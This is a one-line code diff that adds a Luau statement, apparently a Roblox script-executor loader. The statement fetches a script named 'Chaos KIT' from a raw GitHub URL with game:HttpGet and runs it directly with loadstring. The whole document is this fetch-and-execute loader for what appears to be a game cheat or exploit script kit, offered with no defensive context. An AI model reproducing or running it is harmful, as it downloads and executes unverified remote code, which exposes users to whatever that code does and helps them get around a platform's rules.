@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ApollyxnHashed/Chaos-Mobile-Scripts-Kit/main/Chaos%20KIT"))()
